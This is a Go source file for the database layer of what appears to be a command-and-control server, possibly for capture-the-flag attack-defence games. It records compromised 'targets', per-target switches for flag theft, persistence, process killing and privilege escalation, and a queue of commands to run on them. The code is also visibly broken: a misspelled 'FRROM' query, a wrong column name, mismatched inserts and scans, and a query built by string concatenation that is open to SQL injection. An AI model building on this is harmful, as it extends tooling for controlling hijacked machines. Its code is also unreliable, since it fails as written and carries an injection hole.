package main
import(
	"log"
	"time"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
)

type Target_Base_Info struct{
	Ip string
	System string
	Pc_name string
	Create_time time.Time
}
type System_Config_Info struct{
	Flag_get_enable bool
	Flag_send_type string
	Persistence_enable bool
	Kill_process_enable bool
	Privilege_promotion_enable bool
}
type Target_info struct{
	Target_base_info Target_Base_Info
	System_config_info System_Config_Info
}
type Cmd_info struct{
	Id int
	Target_id int
	Cmd_type string
	Cmd_value string
	Cmd_time time.Time
	Cmd_exec bool
	Cmd_exec_time time.Time
	Cmd_exec_result string
	Cmd_cycle_period_second int
}

type Mysqldb struct{
	Sqldb *sql.DB
}

func connectDB() (*Mysqldb,error){
	db,err := sql.Open("sqlite3","./foo.db")
	if err != nil{
		return nil,err
	}
	if err = db.Ping();err!=nil{
		return nil,err
	}
	return &Mysqldb{db},nil
}

func(p Mysqldb)Close(){
	p.Sqldb.Close()
}

func(p Mysqldb)DbSetup(){
	var err error
	const tableDDL = `
	CREATE TABLE IF NOT EXISTS Targets (
		id				INTEGER		PRIMARY KEY AUTOINCREMENT
								UNIQUE
								NOT NULL,
		ip				VARCHAR (16)	UNIQUE
								NOT NULL,
		system				VARCHAR (16),
		pc_name				VARCHAR (128),
		create_time			DATETIME	NOT NULL,
		flag_get_enable			BOOLEAN		DEFAULT	(false)
								NOT NULL,
		flag_send_type			VARCHAR (16)	NOT NULL
								DEFAULT dontsend,
		persistence_enable		BOOLEAN		NOT NULL
								DEFAULT (false),
		kill_process_enable		BOOLEAN		NOT NULL
								DEFAULT (false),
		privilege_promotion_enable	BOOLEAN		NOT NULL
								DEFAULT (false)
	);
	CREATE TABLE IF NOT EXISTS Cmds (
		id				INTEGER		PRIMARY KEY AUTOINCREMENT
								UNIQUE
								NOT NULL,
		target_id			INTEGER		REFERENCES Targets (id) ON DELETE NO ACTION
											ON UPDATE NO ACTION
											MATCH [FULL]
								NOT NULL,
		cmd_type			VARCHAR (8)	NOT NULL
								DEFAULT control,
		cmd_value			TEXT		NOT NULL,
		cmd_time			DATETIME	NOT NULL,
		cmd_exec			BOOLEAN		NOT NULL
								DEFAULT (false),
		cmd_exec_time			DATETIME	NOT NULL
								DEFAULT [1900-00-00 00:00:00],
		cmd_exec_result			TEXT		NOT NULL
								DEFAULT "",
		cmd_cycle_period_second 	INTEGER		NOT NULL
								DEFAULT (0)
	);
	CREATE TABLE IF NOT EXISTS System_config (
		flag_get_enable			BOOLEAN		NOT NULL
								DEFAULT (false),
		flag_send_type			VARCHAR (16)	NOT NULL
								DEFAULT dontsend,
		persistence_enable		BOOLEAN		NOT NULL
								DEFAULT (false),
		kill_process_enable		BOOLEAN		NOT NULL
								DEFAULT (false),
		privilege_promotion_enable 	BOOLEAN		NOT NULL
								DEFAULT (false)
	);
	`
	_,err = p.Sqldb.Exec(tableDDL)
	if err != nil{
		log.Println(err)
		return
	}
	count := 0
	err = p.Sqldb.QueryRow("select count(*) from System_config").Scan(&count)
	if count == 0 {
		const insertDML = "INSERT OR IGNORE INTO System_config (flag_get_enable,flag_send_type,persistence_enable,kill_process_enable,privilege_promotion_enable) VALUES (?,?,?,?,?)"
		stmt,err:=p.Sqldb.Prepare(insertDML)
		if err != nil {
			log.Println(err)
			return
		}
		defer stmt.Close()
		_,err=stmt.Exec(false,"dontsend",false,false,false)
		if err != nil{
			log.Println(err)
			return
		}
	}
}
func (p Mysqldb)Insert_targets(target_info Target_info) (error){
	const insertDML = "INSERT INTO Targets (ip,system,pc_name,create_time,flag_get_enable,flag_send_type,persistence_enable,kill_process_enable,privilege_promotion_enable) VALUES (?,?,?,?,?,?,?,?,?)"
	stmt,err := p.Sqldb.Prepare(insertDML)
	if err != nil{
		log.Println(err)
		return err
	}
	defer stmt.Close()
	result,err := stmt.Exec(target_info.Target_base_info.Ip,target_info.Target_base_info.System,
	target_info.Target_base_info.Pc_name,target_info.Target_base_info.Create_time,
	target_info.System_config_info.Flag_get_enable,target_info.System_config_info.Flag_send_type,
	target_info.System_config_info.Persistence_enable,target_info.System_config_info.Kill_process_enable,
	target_info.System_config_info.Privilege_promotion_enable)
	if err != nil{
		log.Println(err)
		return err
	}
	lastID,err := result.LastInsertId()
	if err != nil{
		log.Println(err)
		return err
	}
	nAffected,err := result.RowsAffected()
	if err != nil {
		log.Println(err)
		return err
	}
	log.Printf("Exec result id=%d,affected=%d\n",lastID,nAffected)
	return nil
}

func (p Mysqldb)Get_System_Config_Info() (System_Config_Info,error){
	System_config_info := System_Config_Info{}
	const selectDML = "SELECT * FROM System_config"
	stmt,err := p.Sqldb.Prepare(selectDML)
	if err != nil{
		log.Println(err)
		return System_config_info,err
	}
	defer stmt.Close()

	rows,err := stmt.Query()
	if err != nil{
		log.Println(err)
		return System_config_info,err
	}
	defer rows.Close()

	for rows.Next(){
		err :=rows.Scan(&System_config_info.Flag_get_enable,
				&System_config_info.Flag_send_type,
				&System_config_info.Persistence_enable,
				&System_config_info.Kill_process_enable,
				&System_config_info.Privilege_promotion_enable)
		if err != nil{
			log.Println(err)
		}
	}
	if err := rows.Err();err!=nil{
		log.Println(err)
		return System_config_info,err
	}
	return System_config_info,nil
}

func (p Mysqldb)Get_targets_info(ip string) ([]Target_info, error){
	var id int
	target_infos := []Target_info{}
	target_info := Target_info{}
	const selectDML = "SELECT * FROM Targets" //TDO need youhua
	stmt,err := p.Sqldb.Prepare(selectDML)
	if err != nil{
		log.Println(err)
		return target_infos,err
	}
	defer stmt.Close()
	rows, err := stmt.Query()
	if err != nil{
		log.Println(err)
		return target_infos,err
	}
	defer rows.Close()
	for rows.Next(){
		err := rows.Scan(&id,&target_info.Target_base_info.Ip,
			&target_info.Target_base_info.System,
			&target_info.Target_base_info.Pc_name,
			&target_info.Target_base_info.Create_time,
			&target_info.System_config_info.Flag_get_enable,
			&target_info.System_config_info.Flag_send_type,
			&target_info.System_config_info.Persistence_enable,
			&target_info.System_config_info.Kill_process_enable,
			&target_info.System_config_info.Privilege_promotion_enable)
		if err != nil{
			log.Println(err)
			continue
		}
		if ip == target_info.Target_base_info.Ip || ip == "all"{
			target_infos = append(target_infos,target_info)
		}
	}
	if err := rows.Err();err!=nil{
		log.Println(err)
		return target_infos,err
	}
	return target_infos,nil
}

func (p Mysqldb)Create_cmd(cmd_info Cmd_info)(error){
	const insertDML = "INSERT INTO Cmds (target_id,cmd_type,cmd_value,cmd_time) VALUES (?,?,?,?)"
	stmt,err := p.Sqldb.Prepare(insertDML)
	if err != nil {
		log.Println(err)
		return err
	}
	defer stmt.Close()
	_,err = stmt.Exec(cmd_info.Cmd_exec,cmd_info.Cmd_exec_time,cmd_info.Cmd_exec_result,cmd_info.Id)
	if err != nil {
		log.Println(err)
		return err
	}
	return nil
}

func (p Mysqldb)Update_cmd_result(cmd_info Cmd_info) (error) {
	const insertDML = "UPDATE Cmds SET cmd_exec=?,cmd_exec_time=?,cmd_exec_result=? WHERE id=?"
	stmt,err := p.Sqldb.Prepare(insertDML)
	if err != nil {
		log.Println(err)
		return err
	}
	defer stmt.Close()
	_,err = stmt.Exec(cmd_info.Cmd_exec,
		cmd_info.Cmd_exec_time,
		cmd_info.Cmd_exec_result,
		cmd_info.Id)
	if err != nil{
		log.Println(err)
		return err
	}
	return nil
}

func (p Mysqldb)Get_cmds_not_exec(ip string) ([]Cmd_info,error){
	var id int
	cmd_infos := []Cmd_info{}
	cmd_info := Cmd_info{}
	err := p.Sqldb.QueryRow("SELECT id from Targets WHERE id='"+ip+"'").Scan(&id)
	if err != nil{
		log.Println(err)
		return cmd_infos,err
	}
	selectDML := "SELECT * FRROM Cmds WHERE cmd_exe=? AND target_id=?"
	stmt,err := p.Sqldb.Prepare(selectDML)
	if err != nil {
		log.Println(err)
		return cmd_infos,err
	}
	defer stmt.Close()
	rows,err:= stmt.Query(0,id)
	if err != nil{
		log.Println(err)
		return cmd_infos,err
	}
	defer rows.Close()
	for rows.Next(){
		err := rows.Scan(&cmd_info.Id,
			&cmd_info.Target_id,
			&cmd_info.Cmd_type,
			&cmd_info.Cmd_value,
			&cmd_info.Cmd_time,
			&cmd_info.Cmd_exec,
			&cmd_info.Cmd_exec_result,
			&cmd_info.Cmd_cycle_period_second)
		if err != nil {
			log.Println(err)
			continue
		}
		cmd_infos = append(cmd_infos,cmd_info)
	}
	if err := rows.Err();err!=nil{
		log.Println(err)
		return cmd_infos,err
	}
	return cmd_infos,nil
}

